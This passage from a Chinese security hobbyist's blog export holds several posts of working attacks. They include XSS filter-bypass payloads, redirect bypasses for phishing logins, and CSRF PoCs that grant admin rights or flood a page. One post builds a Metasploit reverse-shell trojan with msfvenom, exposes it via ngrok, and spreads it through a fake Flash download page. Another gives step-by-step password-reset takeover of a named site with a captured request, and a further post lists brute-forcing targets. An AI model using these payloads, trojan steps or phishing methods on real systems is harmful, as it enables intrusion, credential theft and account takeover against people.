1onerror&#x3D;2onclick&#x3D;3onload&#x3D;4onxxxxx&#x3D; 那么我们可以这样子绕过 1onerror+&#x3D;2onerror%0a&#x3D;3onerror%0d&#x3D;4onerror%09&#x3D; 将javascript:alert变成了javascr_ipt:alert比如如下链接就是这样子过滤的，那么我们可以将其ascii编码 1http:&#x2F;&#x2F;test.xss.tv&#x2F;level8.php?keyword&#x3D;%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B&amp;submit&#x3D;添加友情链接 还可以用%09绕过 1javascr%09ipt:alert(1) 还可以%0a、%0d绕过 过滤了&lt;script&gt; 大小写绕过（&lt;SCriPt&gt;） 双写绕过（&lt;scr&lt;script&gt;ipt&gt;，他会把中间的&lt;script&gt;过滤掉，然后最终变成&lt;script&gt;） 打cookie绕过方法很多站waf没限制弹窗，但是限制获取cookie限制原生代码写的远程加载js文件，那么我们可以利用框架 比如www.a.com站有jquery框架，那么我们可以这样子来引入JS文件来打cookie，案例如下 jquery中可以用$.getScript()函数来引入js文件 空格代替符%0a、%0d、%09在url解码后都会变为空格，所以我们可以将其加入在js代码中，就可以达到扰乱一些waf规则 1&lt;script&gt;%09alert%09(1);&lt;script&gt;2&lt;script&gt;%0dalert%0d(1);&lt;/script&gt;3&lt;script&gt;%0aalert%0a(1);&lt;/script&gt;4&lt;script&gt;alert(document%0a.%09cookie);&lt;/script&gt;5&lt;script&gt;alert(%0ddocument%0a.%09cookie);&lt;/script&gt; 函数绕过js中，函数不仅可以这样 1(alert)(1); 还可以这样 1(alert)(1); 传参可以这样 1alert(1); 还可以这样 1alert&#96;1&#96;; 配合空格替代符效果会更好。 embed解析导致的xss这个解析的条件得在新浏览器才可以，但是很鸡肋，因为无法打cookie（因为这个不是目标网站的域），所以只能执行一些其他的js代码，如跳转，弹窗等，xss payload如下 1&lt;embed src='http://static.zybuluo.com/1kbfree/2o0dq6spzahj8z7yjg64akgp/xss1.pdf'&gt; 如果以后遇到的话会再次更新~","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"Url跳转之白名单绕过以及奇特绕过聊天框思路","slug":"Url跳转之白名单绕过以及奇特绕过聊天框思路","date":"2019-12-17T18:53:30.000Z","updated":"2019-12-17T19:20:47.705Z","comments":true,"path":"2019/12/18/Url跳转之白名单绕过以及奇特绕过聊天框思路/","link":"","permalink":"http://yoursite.com/2019/12/18/Url%E8%B7%B3%E8%BD%AC%E4%B9%8B%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E5%A5%87%E7%89%B9%E7%BB%95%E8%BF%87%E8%81%8A%E5%A4%A9%E6%A1%86%E6%80%9D%E8%B7%AF/","excerpt":"","text":"感谢adrian师傅的教导和分享~ 1、首先打开www.baidu.com，去搜索一下`freebuf` 然后获取的url是 1https:&#x2F;&#x2F;www.baidu.com&#x2F;link?url&#x3D;gKPMFwrhesnw9LtxPlYYEXvjsNQTIQNTYPNjhEpXM09s-h-DNR7CvNQVIdPwClc8&amp;wd&#x3D;&amp;eqid&#x3D;aeedb9cb000057ad000000065c44d9cc 然后打开后会跳转到freebuf，那么现在去打开一个百度跳转处，如下链接是登录的 1https:&#x2F;&#x2F;passport.baidu.com&#x2F;v2&#x2F;?login&amp;u&#x3D;xxxx 但是这里的严格过滤了u参数，必须是www.baidu.com的域名才可以，那么我们可以将其改为如下跳转链接 1https:&#x2F;&#x2F;xxxx.baidu.com&#x2F;xxxx&#x2F;?login&amp;u&#x3D;https:&#x2F;&#x2F;www.baidu.com&#x2F;link?url&#x3D;cUrBa17wHYDW9l0kvo44Pcz0n8X1IaXtotJ21Cox__bxGtPN84hjXbqkSFahOiE-&amp;wd&#x3D;&amp;eqid&#x3D;b6e4a67800000155000000065c44d129 那么我们假设跳转的url是我的，然后我可以改为一打开就弹出密码错误等，然后界面和百度的登录界面一模一样，这样子就可以诱导用户，使其将账号密码发送至我们的服务器。 其实这里还有很多的，比如搜狗、谷歌、等这些搜索引擎，因为这是域名信任关系，虽然我是百度的，但是我可以跳到freebuf，然后去url跳转的地方将其放入，就可以成功的跳转~（这样子的比较鸡肋），但是有很多厂商会认为跳转到谷歌的域名、百度的域名、搜狗的域名是可信的，就将他们设置为白名单，然后我们可以利用这种办法去绕过，导致url跳转漏洞，还有就是比如a站存在url跳转漏洞（http://www.a.com/?u=跳转的链接），然后`b`信任`a`站，允许他跳转到`a`网站（http://www.b.com/?u=www.a.com），那么可以改为如下链接导致`b`站也存在`url`跳转 1http:&#x2F;&#x2F;www.b.com&#x2F;?&#x3D;www.a.com&#x2F;?u&#x3D;跳转的链接 这里的思路和adrian师傅的一个思路类似（非常感谢师傅的分享~），标题是《某聊天客户端锁功能，激活聊天窗口聊天》，思路如下 此时聊天客户端是锁定的状态，然后入群链接是http://xxx.xxx.xxx/add_qun.php?qun=群号（假设），然后去访问这个链接 由于入群链接会进行判断该用户是否加入过该群，如果是已加入的群成员，则进入群窗口 因为这里没有严格的验证聊天客户端是否是锁定的状态 所以直接就略过了锁定的功能就打开聊天框可以聊天了，然后发送的信息也是可以发送出去的~ 就导致了无视锁功能的效果~","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"页面垃圾混杂漏洞","slug":"页面垃圾混杂漏洞","date":"2019-12-17T17:56:33.000Z","updated":"2020-01-31T18:52:18.644Z","comments":true,"path":"2019/12/18/页面垃圾混杂漏洞/","link":"","permalink":"http://yoursite.com/2019/12/18/%E9%A1%B5%E9%9D%A2%E5%9E%83%E5%9C%BE%E6%B7%B7%E6%9D%82%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"单纯好玩 没什么技术含量吧。 有没有想过一个js代码，提取个人资料，然后放到xxx名人言等特效，那么如果这个时候页面会非常卡，如下面一段代码，单纯只是处理这些，就会很卡 1&lt;!DOCTYPE html&gt;2&lt;html&gt;3&lt;head&gt;4 &lt;title&gt;&lt;/title&gt;5&lt;/head&gt;6&lt;body&gt;7 &lt;script type=\"text/javascript\" src=\"http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js\"&gt;&lt;/script&gt;8 &lt;input type=\"\" name=\"test\" id=\"test\" value=\"xxxxxxxxxx...\"&gt;9&lt;/body&gt;10&lt;script type=\"text/javascript\"&gt;11 12var test = $(\"#test\").val();13document.write( test );1415&lt;/script&gt;16&lt;/html&gt; 可以看看真实效果 http://static.zybuluo.com/1kbfree/y2ijjssojzba3v2it4praucg/test2.html 打开非常慢 案例1、发现修改个人资料处存在csrf2、对姓名没有字符限制3、会对字符进行处理等，而且js代码非常多的特效之类的 1、在页面处构造csrf poc 1&lt;html&gt;2 &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;3 &lt;body&gt;4 &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;5 &lt;form action=\"https://xxx/workspace/student/submitUserBasicInfoModify\" method=\"POST\"&gt;6 &lt;input type=\"hidden\" name=\"headerImageUrl\" value=\"&amp;#47;ssoLogin&amp;#47;redirectToLogout\" /&gt;7 &lt;input type=\"hidden\" name=\"nickName\" value=\"csrfcsrf.............(这里很多个csrf字符)\" /&gt;8&lt;input type=\"hidden\" name=\"province\" value=\"\" /&gt;9 &lt;input type=\"hidden\" name=\"city\" value=\"\" /&gt;10 &lt;input type=\"hidden\" name=\"district\" value=\"\" /&gt;11 &lt;input type=\"hidden\" name=\"babyName\" value=\"\" /&gt;12 &lt;input type=\"hidden\" name=\"babyBirthday\" value=\"\" /&gt;13 &lt;input type=\"hidden\" name=\"mobilephone\" value=\"18888888888\" /&gt;14 &lt;input type=\"hidden\" name=\"email\" value=\"\" /&gt;15 &lt;input type=\"hidden\" name=\"qq\" value=\"123&amp;quot;123\" /&gt;16 &lt;input type=\"hidden\" name=\"address\" value=\"\" /&gt;17 &lt;input type=\"hidden\" name=\"logoutAccountTag\" value=\"\" /&gt;18 &lt;input type=\"hidden\" name=\"previewHeaderImageUrl\" value=\"&amp;#47;ssoLogin&amp;#47;redirectToLogout\" /&gt;19 &lt;input type=\"submit\" value=\"Submit request\" /&gt;20 &lt;/form&gt;21 &lt;/body&gt;22&lt;/html&gt; 2、然后打开后页面如图 非常的卡顿 修复1、加上验证码，正常的csrf防护2、对每个字符进行长度限制","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"思路","slug":"兴趣爱好/思路","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E6%80%9D%E8%B7%AF/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"msf+ngrok远控木马制作（并且配合flash钓鱼）","slug":"msf-ngrok远控木马制作","date":"2019-12-14T01:39:12.000Z","updated":"2019-12-17T19:21:19.236Z","comments":true,"path":"2019/12/14/msf-ngrok远控木马制作/","link":"","permalink":"http://yoursite.com/2019/12/14/msf-ngrok%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/","excerpt":"","text":"条件 一个外网服务器（这里用免费的ngrok） Metasploit（生成木马） Kali（映射端口） 工具下载ngrok下载地址https://www.ngrok.cc/#down-client 生成木马开始1、在ngrok官网上注册一个用户然后登陆，选择一个免费/付费隧道，然后选择tcp协议 2、然后打开sunny（在工具下载那里）在kali下输入 1.&#x2F;sunny clientid 隧道id 然后是这样的 打马赛克部分是我的外网的监听服务器 3、生成木马1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.241 LPORT&#x3D;6 -f exe -i 12 &gt; Fuck.exe -p：选择攻击的payload LHOST：监听的本地IP LPORT：监听的本地端口 -f：表示为exe程序 -i：重复编码12次(听说有助于免杀) 然后就会生成一个Fuck.exe的文件 4、使用msf监听1msf5 &gt; use exploit&#x2F;multi&#x2F;handler2msf5 exploit(multi&#x2F;handler) &gt; set payloads windows&#x2F;meterpreter&#x2F;reverset_tcp3payloads &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverset_tcp4msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.31.2415lhost &#x3D;&gt; 192.168.31.2416msf5 exploit(multi&#x2F;handler) &gt; set lport 67lport &#x3D;&gt; 68msf5 exploit(multi&#x2F;handler) &gt; exploit 然后在window下打开Fuck.exe后，Kali会返回如下界面（meterpreter） 这个时候已经可以监控打开这个exe文件的电脑了。 Flash钓鱼钓鱼页面下载页：https://github.com/r00tSe7en/Fake-flash.cn 打开index.html，修改如下为你木马的下载地址 然后打开页面点击就会跳转到https://www.xxxxxxxxxxxxxx.cn/。 利用条件可以如下： xss打不到cookie的时候，可以填写跳转到这里。 收集信息到位，挖到一个url跳转，然后丢到他们内部群里。 以上条件纯属虚构，如违法立删… …","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"远控","slug":"远控","permalink":"http://yoursite.com/tags/%E8%BF%9C%E6%8E%A7/"}]},{"title":"一次逻辑测试进入管理员权限","slug":"一次逻辑测试进入管理员权限","date":"2019-12-07T07:25:15.000Z","updated":"2020-01-31T18:53:43.903Z","comments":true,"path":"2019/12/07/一次逻辑测试进入管理员权限/","link":"","permalink":"http://yoursite.com/2019/12/07/%E4%B8%80%E6%AC%A1%E9%80%BB%E8%BE%91%E6%B5%8B%E8%AF%95%E8%BF%9B%E5%85%A5%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/","excerpt":"","text":"漏洞过程： 注册用户（这里很奇葩，网站把没引入layer.js来限制用户注册，然后用burp抓取然后往返回包里添加http://res.layui.com/layui/release/layer/dist/layer.js?v=3111即可） 注册登录后存在越权漏洞，原理如下我是id为2000的用户，然后我在修改资料的时候存在越权漏洞，抓包修改id为1的账户也就是管理员的账户信息，然后程序就会自动认为我是管理员，然后给我赋值为管理员权限，如下是过程 复现过程1、注册用户（这里是可以绕过的注册） 比如点击注册的时候是没反应的 看f12测试，看出没有引入layer，然后我们去找到这个js链接 1http:&#x2F;&#x2F;res.layui.com&#x2F;layui&#x2F;release&#x2F;layer&#x2F;dist&#x2F;layer.js?v&#x3D;3111 然后抓返回包添加进去 注册成功后登陆进去，访问如下poc即可，这个html页面是修改id为1用户的性别为女性，即可达到管理员权限，原理解释过了。 1&lt;html&gt;2 &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;3 &lt;body&gt;4 &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;5 &lt;form action=\"http://不告诉你/system/user/profile/update\" method=\"POST\"&gt;6 &lt;input type=\"hidden\" name=\"userId\" value=\"1\" /&gt;7 &lt;input type=\"hidden\" name=\"sex\" value=\"1\" /&gt;8 &lt;input type=\"submit\" value=\"Submit request\" /&gt;9 &lt;/form&gt;10 &lt;/body&gt;11&lt;/html&gt; 然后就变成管理员了 =。=","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"好文","slug":"兴趣爱好/好文","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E5%A5%BD%E6%96%87/"}],"tags":[{"name":"Hacker","slug":"Hacker","permalink":"http://yoursite.com/tags/Hacker/"}]},{"title":"我的渗透思路","slug":"自己的渗透思路","date":"2019-12-05T20:10:11.000Z","updated":"2019-12-17T19:21:37.180Z","comments":true,"path":"2019/12/06/自己的渗透思路/","link":"","permalink":"http://yoursite.com/2019/12/06/%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/","excerpt":"","text":"拿到目标站点 xxx.com 收集子域名 爆破端口 查看cms找响应漏洞 收集whois，等相关信息，然后用工具生成对应字典 扫描目录 如用第五步获取了后台目录，如果可以爆破，字典源于第四步 查看是什么搭建的，他的插件是否有利用漏洞 查c段 技巧 懒出来的 用nmap扫描c段，然后使用hydra来爆破一些端口弱口令，如3306、3389、21，总有那么一些会出来的，如果没有，每逢过节烧烧香。 常用工具如下在线短信验证码接收1：https://yunduanxin.net在线短信验证码接收2：https://becmd.com/DNSLOG：http://dnslog.cn/在线邮箱接收1：http://www.yopmail.com/zh/在线邮箱接收2：http://mail.bccto.me/在线指纹识别1（云悉）：http://www.yunsee.cn/在线指纹识别2：http://whatweb.bugscaner.com/look/微步在线：https://www.threatbook.cn/爱站：https://www.aizhan.com/站长工具：http://tool.chinaz.com/在线编码/解码工具：http://tool.chinaz.com/Tools/urlencode.aspx在线查找历史IP：https://toolbar.netcraft.com/site_report?url=http://www.baidu.com在线子域名爆破：https://phpinfo.me/domain/在线身份证生成器：https://www.tiebazhushou.com/谷歌镜像：https://gugeji.com/XSS平台：https://xss.pt/提权辅助工具：https://bugs.hacking8.com/tiquan/","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Hacker","slug":"Hacker","permalink":"http://yoursite.com/tags/Hacker/"}]},{"title":"19year","slug":"19year","date":"2019-12-05T18:48:12.000Z","updated":"2020-01-31T19:42:40.016Z","comments":true,"path":"2019/12/06/19year/","link":"","permalink":"http://yoursite.com/2019/12/06/19year/","excerpt":"","text":"其实今年很操蛋，自己很快乐，也很悲伤。 快乐源于疯，悲伤亦是。我认识了很多朋友，做了很多疯狂的事，但是我逐渐放下了背上的重任、心中的理想…我花费了半年多的时间，忘记了我一整年的学习成果，因为我都去玩了，而且玩的有点野，有点浪。还好，路还长，人暂年轻，未亡，仍可学。博客记录成长，监督成长。 分享一个自己的照片吧 以前的Blog： https://only-free.github.io/ 我知道以前的好看，但是我懒得重新弄了，老了，顾不上外观了。","categories":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"感慨","slug":"感慨","permalink":"http://yoursite.com/tags/%E6%84%9F%E6%85%A8/"}]},{"title":"厚学网任意用户密码重置","slug":"厚学网任意用户密码重置","date":"2019-10-26T04:01:02.000Z","updated":"2019-12-31T04:01:27.673Z","comments":true,"path":"2019/10/26/厚学网任意用户密码重置/","link":"","permalink":"http://yoursite.com/2019/10/26/%E5%8E%9A%E5%AD%A6%E7%BD%91%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","excerpt":"","text":"1、打开Url：https://i.houxue.com/accounts/getpwd/step1/?type=1，然后写上正确的手机和验证码 2、然后下一步来到重置页面（经测试这个是经过key来重置用户密码的），然后再去打开一个找回密码页面 3、重新打开一个找回密码Url，然后输入18888888881后，获取验证码，然后乱写验证码然后把返回包的false修改为true，可以获得到一个key，如下图 然后还会获取一个数据包 1POST &#x2F;accounts&#x2F;getpwd&#x2F;step1submit&#x2F;?type&#x3D;1 HTTP&#x2F;1.12Host: i.houxue.com3User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.04Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.015Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7Content-Type: application&#x2F;x-www-form-urlencoded8x-requested-with: XMLHttpRequest9Referer: https:&#x2F;&#x2F;i.houxue.com&#x2F;accounts&#x2F;getpwd&#x2F;step1&#x2F;?type&#x3D;110Content-Length: 6311Cookie: houxue_aid&#x3D;d45002e7585ae083e0c17f3bb0dc073bf3b6a51d%7E236; session&#x3D;b70qlb84bn8ktfdhrojllvm5d1; historysearch&#x3D;780b23892275abf28f2c78f2fc99fa78b9c453a6%7Ea%3A2%3A%7Bi%3A0%3Ba%3A5%3A%7Bs%3A5%3A%22refer%22%3Bs%3A54%3A%22https%253A%252F%252Fsearch.houxue.com%252Fkecheng.html%253Fkw%253D%22%3Bs%3A4%3A%22rows%22%3Bs%3A1%3A%220%22%3Bs%3A2%3A%22kw%22%3Bs%3A0%3A%22%22%3Bs%3A3%3A%22url%22%3Bs%3A96%3A%22https%253A%252F%252Fsearch.houxue.com%252Findex.php%253Fcon%253Dkecheng%2526act%253Dsearchlog%2526kw%253D%2526rows%253D0%22%3Bs%3A4%3A%22type%22%3Bi%3A2%3B%7Di%3A1%3Ba%3A5%3A%7Bs%3A5%3A%22refer%22%3Bs%3A60%3A%22https%253A%252F%252Fsearch.houxue.com%252Fkecheng.html%253Fkw%253D123321%22%3Bs%3A4%3A%22rows%22%3Bs%3A1%3A%220%22%3Bs%3A2%3A%22kw%22%3Bs%3A6%3A%22123321%22%3Bs%3A3%3A%22url%22%3Bs%3A102%3A%22https%253A%252F%252Fsearch.houxue.com%252Findex.php%253Fcon%253Dkecheng%2526act%253Dsearchlog%2526kw%253D123321%2526rows%253D0%22%3Bs%3A4%3A%22type%22%3Bi%3A2%3B%7D%7D; 50de9d33ecd4872aa4aac3cc9f39e7c1&#x3D;2b4e8357c8afa313070b8f4cfc47dc40cd338b31%7E50de9d33ecd4872aa4aac3cc9f39e7c1; UM_distinctid&#x3D;1667830aecc24b-0e97b8a03814278-1262694a-19a100-1667830aecd18d; CNZZDATA1254568359&#x3D;604639163-1539614372-https%253A%252F%252Fsearch.houxue.com%252F%7C1539619846; 0&#x3D;1e487d840b5f8d69c757915ae3312047b89c1c82%7E0; BEC&#x3D;07c8053d39ddefe935f23f5319686256|1539615389|1539615269; device&#x3D;e710985d5d064a00c4635c6f18ace055a350beba%7Epc; coodomain&#x3D;5bc0163fa0f56d2bd770c1e59427f73c6c436804%7Egz; trueareainfo&#x3D;762b685507ce792fb38766feff006fc6ff0d9023%7E%7B%22Id%22%3A%22236%22%2C%22AreaName%22%3A%22%5Cu5e7f%5Cu5dde%22%2C%22PId%22%3A%2223%22%2C%22Domain%22%3A%22gz%22%2C%22PinYin%22%3A%22guangzhou%22%2C%22Level%22%3A%221%22%2C%22Workphone%22%3A%22400-656-3685%22%2C%22OnlineCallCode%22%3A%22%3Cscript++type%3D%5C%22text%5C%2Fjavascript%5C%22+src%3D%5C%22http%3A%5C%2F%5C%2Fim.houxue.com%5C%2Fchat%5C%2Fotherstat%5C%2Fstat%3Fsiteid%3D11995%5C%22%3E%3C%5C%2Fscript%3E%22%2C%22SiteCounterCode%22%3A%22%22%7D; loginid&#x3D;1eefa46171fb14d2c6ef16ee7f8242a5f5f7ecb6%7E118099112DNT: 113Connection: close1415ways&#x3D;phone&amp;phone&#x3D;18888888881&amp;short_msg&#x3D;000000&amp;email&#x3D;&amp;short_msg&#x3D; 然后查看他返回包 获取到key为717c1d9e980e87d25ba2bdac618a8776，然后回到之前重置密码处Url,把获取的key替换进去 然后18888888881的密码就被修改为123456oo了","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"对web安全的一些经验分享[url跳转篇]","slug":"对web安全的一些经验分享-url跳转篇","date":"2019-05-23T01:01:26.000Z","updated":"2019-12-18T01:02:25.345Z","comments":true,"path":"2019/05/23/对web安全的一些经验分享-url跳转篇/","link":"","permalink":"http://yoursite.com/2019/05/23/%E5%AF%B9web%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB-url%E8%B7%B3%E8%BD%AC%E7%AF%87/","excerpt":"","text":"今年是挖洞的一年了，也对web安全产生了感情，之前盲目于一直挖洞每天技术都没什么增长，多的仅是那么一点点的经验，而且通过这次的护网行动，也看出了自己的很多不足，说白了就是很菜然后自己还没看清自己，所以接下来的日子里，自己都会尽量去接触一些自己的知识盲区来扩大自己的知识面。 都是自己的一些心得，并非炒作于哪儿 针对url跳转漏洞1、在登录\\注册\\找回密码\\退出处2、站内跳（如在当前页面下写一个链接，然后我们点击的话就会以这种形式&lt;a href=&#39;http://www.站内.com/?tourl=写下的链接&#39;&gt;写下的链接&lt;/a&gt;）还有404页面跳，成功执行某操作的跳3、退回（比如有些页面有返回的功能，就是跳转到上一个页面，而且是根据referer值来跳的） 登录\\注册\\找回密码\\退出这些点我们可以考虑利用fuzz来对其进行探查出跳转漏洞 我的fuzz中理解为分 2 种 盲fuzz来找跳转参数 针对性找跳转参数 一个栗子（登陆处fuzz）这是一个登陆系统 1https:&#x2F;&#x2F;www.xxx.xxx&#x2F;account&#x2F;signin 那么我们可以选择第一种办法来对其进行fuzz来爆破出跳转参数，比如url、go、re等，但是这种不一定有效而且高效，所以我一般会先尝试第二种办法 针对性 找跳转参数 1.审查源代码 因为很多跳转参数都是在前端构造的 2.查询hidden、url之类的参数（因为很多系统都会把要跳转的参数放在input上，并且设置其为隐藏，这样子可以不影响界面美观，然后把value的值作为跳转参数，登陆后读取其值来确认要跳转的地儿~） 那么我们就提取出这个returnUrl构造在url里 1https:&#x2F;&#x2F;www.xxx.abc&#x2F;account&#x2F;signin?returnUrl&#x3D;http:&#x2F;&#x2F;www.xxx.abc&#x2F;123321 这里第一步测试的时候是先填他的主域名（因为如果你一上来就填写你想跳转的url他可能有过滤的可能直接将其替换为空或者是主站域名），后面的123321是个人的日常习惯，用户定位源代码处的，这个小小小技巧也可以用在测试xss漏洞上，快速定位源代码的回显处 3.查看效果 4.尝试直接输入想跳转的url，看他是否有过滤 然后登陆后就成功跳转了~ 再举一个栗子一个管理员才可以登录的系统，可是俺没有账号密码如何判断他是否存在url跳转呢o v o~，（我爆破不出来，我捡你一个洞总可以吧╭(╯^╰)╮） 如下是一个管理员的登录系统（只要不能注册的界面，俺都叫他管理员的登录系统） 1http:&#x2F;&#x2F;xxx.admin.xxx&#x2F;supplier_web&#x2F;login?returnUrl&#x3D;http%3A%2F%2F127.0.0.1 可以看到这里不能注册，我们也不知道密码，那么怎么测试他是否可以跳转？ 其实很简单 登录的时候抓包 修改状态码（把flase改成true这些） 然后就会跳转，因为这里的逻辑是，服务器通过判断状态码来给你构造一个登录流程，而这个登录流程支持跳转，那么就可以成功的测试出来啦~ 本来服务器返回的statusCode是500的，我将其修改为200 接着就有这么一个请求过来 成功跳转~ 然后还有站内跳，成功提示后跳都是一样的，对参数进行fuzz，然后绕过，如果绕不过就砸电脑一气呵成即可； 还有一个是adrian师傅和我分享过的，把登录处的login改成logout，然后对跳转参数进行过滤的功能就不存在了，因为开发者都不会想到在logout参数那里做参数过滤，然后就导致了可以直接导致url跳转漏洞的产生 退回功能的跳转导致了反射xss之前遇到过，但是忘记记录了，也是比较好玩的我大概讲解一下 1、打开http://www.111.com/back他会跳转到referer的值（而且这里可以解析html，并且referer值在script脚本里&lt;script&gt;url = &#39;referer值&#39;;window.location.href=url&lt;/script&gt;）2、我在自己的网站创建了一个文件(only_free.php)，然后其功能是跳转到www.111.com/back，那么我可以这样子请求 1http:&#x2F;&#x2F;www.only_free.com&#x2F;only_free.php?name&#x3D;&#39;;alert(1);b&#x3D;&#39;1 最后http://www.111.com/back里的js代码就变成 1url &#x3D; &#39;&#39;;alert(1);b&#x3D;&#39;1&#39;;window.location.href&#x3D;url 然后就成功弹窗了。 作者微信：refuel_iamfree 有兴趣的朋友可以加我一起交流 更多Url跳转文章：https://www.zybuluo.com/1kbfree/note/1394679","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"PHP函数统计","slug":"PHP函数统计","date":"2019-02-13T00:20:03.000Z","updated":"2019-12-25T00:25:18.315Z","comments":true,"path":"2019/02/13/PHP函数统计/","link":"","permalink":"http://yoursite.com/2019/02/13/PHP%E5%87%BD%E6%95%B0%E7%BB%9F%E8%AE%A1/","excerpt":"","text":"当初自己也不知道写这个干什么，干劲十足吧，既然写了就发出来继续更新吧。 不显示错误信息:error_reporting(0) 文件包含函数:include()、include_once()、require()、require_once() 开启session:session_start() 是否开启了gpc功能:if( !get_magic_quotes_gpc() ){} 过滤函数:addslashes()入敏感的内容会被转义(\\) strtoupper()用法： 将内容转成大写 等号用处分类： 11、&#x3D;：赋值，在逻辑运算时也有效；232、&#x3D;&#x3D;：等于运算，但是不比较值的类型；453、&#x3D;&#x3D;&#x3D;：完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。 strpos()用法： call_user_func()用法： 如果我们传递?a=assert&amp;b=phpinfo()就会执行phpinfo函数，如图 readfile()用法： 定义和用法 readfile() 函数输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的内容与字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。 readfile( filename,include_path,context ) 参数 描述 filename 必需。规定要读取的文件。 include_path 可选。如果也想在include_path中搜索文件，可以使用该参数并将其设为 true。 context 可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。 1echo readfile( 'cai_team.txt' ); define用法: 1&lt;?php2define(\"GREETING\",\"Hello world!\");34var_dump( defined(\"GREETING\") ); //如果存在返回True5var_dump( defined(\"only_free\") );6?&gt; 输出： chdir用法: mkdir用法: 1&lt;?php2 mkdir(&#39;1.iamfree&#39;) &#x2F;&#x2F;会在当前目录下创建一个1.iamfree文件夹3?&gt; const用法： 1&lt;?php2 const name&#x3D;&#39;iamfree&#39;;3 echo name;45&#x2F;*6输出:iamfree7*&#x2F;8?&gt; htmlspecialchars()函数： 执行转换: 字符 替换后 &amp; (&amp; 符号) &amp;amp; “ (双引号) &amp;quot;，除非设置了 ENT_NOQUOTES ‘ (单引号) 设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、ENT_XHTML 或 ENT_HTML5)。 &lt; (小于) &amp;lt &gt; (大于) &amp;gt extract()函数: parse_str()： 1 &lt;?php23 parse_str(&#39;name&#x3D;iamfree&#39;); &#x2F;&#x2F;把name变成变量名，iamfree变成变量值4 echo $name;&#x2F;&#x2F;输出iamfree56?&gt; import_request_variables(): 此函数把GET、POST、COOKIE的参数注册为变量，一般不建议开启 注意,只在 PHP4.1到PHP5.4之间可用 1&lt;?php23 $name &#x3D; &#39;whoami&#39;;4 import_request_variables(&#39;GP&#39;); &#x2F;&#x2F;G表示GET、P表示POST如果有C表示COOKIE；这里的GP表示注册GET和POST请求的参数为变量5 echo $name;67?&gt; 效果： array_key_exists()： 1array_key_exists ( $key , $array ) 数组里有键 key 时，array_key_exists() 返回 TRUE。 key 